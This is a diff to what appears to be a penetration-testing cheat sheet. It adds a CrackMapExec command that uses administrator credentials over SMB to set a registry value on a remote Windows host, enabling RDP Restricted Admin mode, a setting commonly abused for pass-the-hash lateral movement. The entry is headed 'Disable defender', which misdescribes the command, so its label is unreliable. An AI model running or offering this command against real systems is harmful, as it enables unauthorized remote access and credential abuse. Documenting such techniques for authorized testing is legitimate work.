@@ -2349,6 +2349,11 @@ Remove color from script output
 sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g"
 ```
 
+Disable defender 
+```bash
+cme smb host -u Administrator -p password -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
+# feel free to add --exec-method msiexec if you encounter issues
+```
 
 ## Linux Priv Esc
 
